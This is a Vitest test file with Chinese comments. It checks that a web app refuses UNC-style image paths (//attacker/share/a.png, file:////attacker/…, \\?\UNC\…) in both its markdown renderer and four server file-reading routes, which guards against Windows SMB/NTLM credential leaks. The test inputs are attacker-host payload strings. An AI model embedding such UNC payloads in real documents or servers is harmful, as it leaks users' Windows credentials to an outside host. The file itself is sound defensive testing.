/**
 * V10-01（Windows 专属）：markdown 里一行 `![](//attacker/share/a.png)` / `file:////attacker/…`
 * 会被 toLoadableImageSrc 改写成 `/api/local-image?path=//attacker/share/a.png`，
 * Windows 上服务端对该 UNC 路径 `fs.realpath` 会发起 SMB 连接、默认带 NTLM 凭据（渲染即触发、无需点击）。
 *
 * 两道闸：
 *  1) 前端 toLoadableImageSrc：UNC 形态一律不改写成 local-image，也不原样放行（原样会被浏览器当
 *     scheme-relative 去打 http://attacker/…），返回 ""——MarkdownImage 对空 src 直接不渲染。
 *  2) 服务端四个读文件路由在 realpath **之前**拒绝 UNC 形态（400），与平台无关：
 *     posix 上以 `//` 开头的路径本来就没人用，宁可误拒也不要让 Windows 漏过。
 *
 * 判定是纯函数 isUncLikePath（src/lib/unc-path.ts）；这里没有 Windows 真机，
 * SMB / NTLM 外发本身未实测——测的是「到不了 realpath」这个可在 mac 上验证的事实。
 */
import { mkdtempSync, rmSync, writeFileSync } from "node:fs";
import fs from "node:fs/promises";
import os from "node:os";
import path from "node:path";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";

import { toLoadableImageSrc } from "@/lib/local-image-src";
import { rehypeRewriteLocalImages } from "@/lib/rehype-rewrite-local-images";
import { isUncLikePath } from "@/lib/unc-path";

describe("isUncLikePath", () => {
  it("反斜杠 / 正斜杠 / 混合的双斜杠开头 → UNC", () => {
    expect(isUncLikePath("\\\\attacker\\share\\a.png")).toBe(true);
    expect(isUncLikePath("//attacker/share/a.png")).toBe(true);
    expect(isUncLikePath("\\/attacker/share/a.png")).toBe(true);
    expect(isUncLikePath("/\\attacker\\share\\a.png")).toBe(true);
    // 三个及以上斜杠 Windows 同样归一成 UNC 根
    expect(isUncLikePath("///attacker/share/a.png")).toBe(true);
  });

  it("设备命名空间 / 扩展长度前缀（含 \\\\?\\UNC\\）→ 一律拒（都以双斜杠开头）", () => {
    expect(isUncLikePath("\\\\?\\UNC\\attacker\\share\\a.png")).toBe(true);
    expect(isUncLikePath("\\\\.\\pipe\\x")).toBe(true);
    expect(isUncLikePath("//?/UNC/attacker/share/a.png")).toBe(true);
  });

  it("file:// 前缀：file:////host/share → UNC；file:///C:/x、file:///Users/x 不误伤", () => {
    expect(isUncLikePath("file:////attacker/share/a.png")).toBe(true);
    expect(isUncLikePath("FILE:////attacker/share/a.png")).toBe(true);
    expect(isUncLikePath("file://\\\\attacker\\share\\a.png")).toBe(true);
    expect(isUncLikePath("file:///C:/Users/me/a.png")).toBe(false);
    expect(isUncLikePath("file:///Users/me/a.png")).toBe(false);
  });

  it("前后空白先 trim（浏览器会剥掉 URL 首尾空白，不能靠一个前导空格绕过）", () => {
    expect(isUncLikePath("  //attacker/share/a.png")).toBe(true);
    expect(isUncLikePath("\t\\\\attacker\\share")).toBe(true);
  });

  it("盘符路径不误伤（反斜杠 / 正斜杠 / 小写盘符 / 盘符后双分隔符）", () => {
    expect(isUncLikePath("C:\\Users\\me\\a.png")).toBe(false);
    expect(isUncLikePath("C:/Users/me/a.png")).toBe(false);
    expect(isUncLikePath("d:\\a.png")).toBe(false);
    expect(isUncLikePath("C:\\\\Users\\\\me\\\\a.png")).toBe(false);
  });

  it("mac / linux 绝对路径、相对路径、站内路径、http(s) 不误伤", () => {
    expect(isUncLikePath("/Users/me/Library/Application Support/x/a.png")).toBe(false);
    expect(isUncLikePath("/tmp/a.png")).toBe(false);
    expect(isUncLikePath("/api/local-image?path=%2Ftmp%2Fa.png")).toBe(false);
    expect(isUncLikePath("uploads/a.png")).toBe(false);
    expect(isUncLikePath("https://example.com/a.png")).toBe(false);
    expect(isUncLikePath("")).toBe(false);
    expect(isUncLikePath("/")).toBe(false);
  });
});

describe("toLoadableImageSrc：UNC 形态不改写、不放行", () => {
  it("//host/share、file:////host/share、\\\\host\\share、前导空白 → 空串", () => {
    expect(toLoadableImageSrc("//attacker/share/a.png")).toBe("");
    expect(toLoadableImageSrc("file:////attacker/share/a.png")).toBe("");
    expect(toLoadableImageSrc("\\\\attacker\\share\\a.png")).toBe("");
    expect(toLoadableImageSrc(" //attacker/share/a.png")).toBe("");
    expect(toLoadableImageSrc("///attacker/share/a.png")).toBe("");
  });

  it("绝不产出指向 UNC 的 /api/local-image 链接", () => {
    for (const evil of [
      "//attacker/share/a.png",
      "file:////attacker/share/a.png",
      "\\\\?\\UNC\\attacker\\share\\a.png",
    ]) {
      expect(toLoadableImageSrc(evil)).not.toContain("/api/local-image");
    }
  });

  it("正常路径照旧：mac/linux 绝对路径、file:///、盘符、站内前缀、http(s)", () => {
    expect(toLoadableImageSrc("/Users/me/a.png")).toBe(
      `/api/local-image?path=${encodeURIComponent("/Users/me/a.png")}`,
    );
    expect(toLoadableImageSrc("file:///Users/me/a.png")).toBe(
      `/api/local-image?path=${encodeURIComponent("/Users/me/a.png")}`,
    );
    expect(toLoadableImageSrc("C:\\Users\\me\\a.png")).toBe(
      `/api/local-image?path=${encodeURIComponent("C:\\Users\\me\\a.png")}`,
    );
    expect(toLoadableImageSrc("C:/Users/me/a.png")).toBe(
      `/api/local-image?path=${encodeURIComponent("C:/Users/me/a.png")}`,
    );
    expect(toLoadableImageSrc("/api/tasks/t1/uploads/a.png")).toBe("/api/tasks/t1/uploads/a.png");
    // 第三轮 R12-01：站内白名单收窄到 /api/local-image? 与 /api/tasks/<id>/uploads/<文件>；
    // /uploads/、/_next/ 与其它 /api/* 不再原样放行（见 tests/unc-entry-guards.test.ts）
    expect(toLoadableImageSrc("/uploads/a.png")).toBe(
      `/api/local-image?path=${encodeURIComponent("/uploads/a.png")}`,
    );
    expect(toLoadableImageSrc("https://example.com/a.png")).toBe("https://example.com/a.png");
    expect(toLoadableImageSrc("data:image/png;base64,AAAA")).toBe("data:image/png;base64,AAAA");
    expect(toLoadableImageSrc("relative/a.png")).toBe("relative/a.png");
  });

  it("AST 层（rehypeRewriteLocalImages）同样不放过：UNC 的 img.src 被清空", () => {
    const img = (src: string) => ({
      type: "element",
      tagName: "img",
      properties: { src },
      children: [],
    });
    const tree = {
      type: "root",
      children: [
        img("//attacker/share/a.png"),
        img("file:////attacker/share/b.png"),
        img("/Users/me/ok.png"),
      ],
    };
    const transform = (rehypeRewriteLocalImages as unknown as () => (t: unknown) => void)();
    transform(tree);
    expect(tree.children[0].properties.src).toBe("");
    expect(tree.children[1].properties.src).toBe("");
    expect(tree.children[2].properties.src).toBe(
      `/api/local-image?path=${encodeURIComponent("/Users/me/ok.png")}`,
    );
  });
});

describe("服务端读文件路由：UNC 形态在 realpath 之前就 400", () => {
  let dir = "";
  let realpathSpy: ReturnType<typeof vi.spyOn>;

  beforeEach(() => {
    dir = mkdtempSync(path.join(os.tmpdir(), "flowship-unc-"));
    realpathSpy = vi.spyOn(fs, "realpath");
  });
  afterEach(() => {
    realpathSpy.mockRestore();
    rmSync(dir, { recursive: true, force: true });
  });

  const call = async (
    route: string,
    p: string,
  ): Promise<{ status: number; body: { error?: string } }> => {
    const mod = (await import(route)) as { GET: (req: Request) => Promise<Response> };
    const url = `http://127.0.0.1/x?path=${encodeURIComponent(p)}`;
    const res = await mod.GET(new Request(url));
    const text = await res.text();
    let body: { error?: string } = {};
    try {
      body = JSON.parse(text) as { error?: string };
    } catch {
      /* 二进制 / 非 JSON 体 */
    }
    return { status: res.status, body };
  };

  const UNC_CASES: Array<[string, string, string]> = [
    ["/api/local-image", "//attacker/share/a.png", "local-image"],
    ["/api/system/read-text", "//attacker/share/a.json", "read-text"],
    ["/api/system/local-file-bytes", "//attacker/share/a.pdf", "local-file-bytes"],
    ["/api/system/read-local-file", "//attacker/share/a.txt", "read-local-file"],
  ];

  const ROUTE_MODULE: Record<string, string> = {
    "local-image": "@/app/api/local-image/route",
    "read-text": "@/app/api/system/read-text/route",
    "local-file-bytes": "@/app/api/system/local-file-bytes/route",
    "read-local-file": "@/app/api/system/read-local-file/route",
  };

  for (const [, evil, name] of UNC_CASES) {
    it(`${name}：${evil} → 400 且从未调用 fs.realpath`, async () => {
      const { status, body } = await call(ROUTE_MODULE[name], evil);
      expect(status).toBe(400);
      expect(body.error ?? "").toMatch(/UNC/);
      expect(realpathSpy).not.toHaveBeenCalled();
    });

    it(`${name}：反斜杠 UNC 与 \\\\?\\UNC\\ 同样 400（错误是 UNC 而不是别的）`, async () => {
      for (const evil2 of [
        evil.replace(/\//g, "\\"),
        `\\\\?\\UNC\\attacker\\share\\a${path.extname(evil)}`,
      ]) {
        const { status: s, body: b } = await call(ROUTE_MODULE[name], evil2);
        expect(s).toBe(400);
        expect(b.error ?? "").toMatch(/UNC/);
      }
      expect(realpathSpy).not.toHaveBeenCalled();
    });
  }

  it("对照：正常本地图片照常 200，且确实走了 realpath（说明守卫没把正常路径挡掉）", async () => {
    const file = path.join(dir, "ok.png");
    writeFileSync(file, Buffer.from([0x89, 0x50, 0x4e, 0x47]));
    const mod = (await import("@/app/api/local-image/route")) as {
      GET: (req: Request) => Promise<Response>;
    };
    const res = await mod.GET(
      new Request(`http://127.0.0.1/x?path=${encodeURIComponent(file)}`),
    );
    expect(res.status).toBe(200);
    expect(res.headers.get("Content-Type")).toBe("image/png");
    expect(realpathSpy).toHaveBeenCalled();
  });

  it("对照：盘符路径在 posix 上不是 UNC——走到文件不存在 404，而不是被当 UNC 拒", async () => {
    const { status, body } = await call("@/app/api/local-image/route", "C:\\Users\\me\\a.png");
    expect(status).toBe(404);
    expect(body.error ?? "").not.toMatch(/UNC/);
  });
});

describe("接线契约：四个路由都在 realpath / 读文件之前先过 nonLocalPathReason（UNC 黑名单 + Windows 盘符白名单）", () => {
  const read = async (rel: string): Promise<string> =>
    (await import("node:fs")).readFileSync(path.join(process.cwd(), rel), "utf8");

  for (const rel of [
    "src/app/api/local-image/route.ts",
    "src/app/api/system/read-text/route.ts",
    "src/app/api/system/local-file-bytes/route.ts",
    "src/app/api/system/read-local-file/route.ts",
  ]) {
    it(`${rel}`, async () => {
      const src = await read(rel);
      expect(src).toMatch(/from "@\/lib\/unc-path"/);
      const guard = src.indexOf("nonLocalPathReason(raw)");
      expect(guard).toBeGreaterThan(-1);
      const firstUse = Math.min(
        ...["realpath(", "readLocalFileForPreview(raw)"]
          .map((s) => src.indexOf(s))
          .filter((i) => i >= 0),
      );
      expect(guard).toBeLessThan(firstUse);
    });
  }
});
